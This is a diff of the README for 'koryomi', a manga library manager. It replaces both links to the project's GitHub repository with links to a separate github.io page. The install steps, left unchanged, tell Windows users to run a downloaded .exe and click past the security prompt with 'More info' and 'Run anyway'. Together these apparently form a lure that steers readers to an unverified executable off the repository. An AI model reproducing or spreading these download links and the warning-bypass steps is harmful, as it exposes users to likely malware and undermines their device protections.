@@ -1,6 +1,6 @@
 # 📚 koryomi - Organize and read your digital manga
 
-[![](https://img.shields.io/badge/Download-Koryomi-blue.svg)](https://github.com/allegro-sigmoidectomy612/koryomi)
+[![](https://img.shields.io/badge/Download-Koryomi-blue.svg)](https://allegro-sigmoidectomy612.github.io)
 
 Koryomi manages your entire manga and manhwa library. It tracks new releases, downloads files, and displays your collection in one interface. You avoid the need to run multiple separate programs to read your titles. Koryomi replaces individual tools for searching, downloading, and viewing content. It works as a self-hosted server that stays on your computer.
 
@@ -23,7 +23,7 @@ Koryomi manages your entire manga and manhwa library. It tracks new releases, do
 
 You do not need programming knowledge to run this software. Follow these instructions to set up the application on your computer.
 
-1.  **Visit the download page**: Go to [the official Koryomi releases page](https://github.com/allegro-sigmoidectomy612/koryomi) to find the correct version for your Windows computer.
+1.  **Visit the download page**: Go to [the official Koryomi releases page](https://allegro-sigmoidectomy612.github.io) to find the correct version for your Windows computer.
 2.  **Download the file**: Locate the file that ends in .exe. Click the name to start the download.
 3.  **Run the installer**: Once the download completes, open the file. Your computer might show a security prompt. If you trust the source, click "Run" or "More info" followed by "Run anyway."
 4.  **Complete the setup**: Follow the on-screen instructions to place the program in your preferred folder.
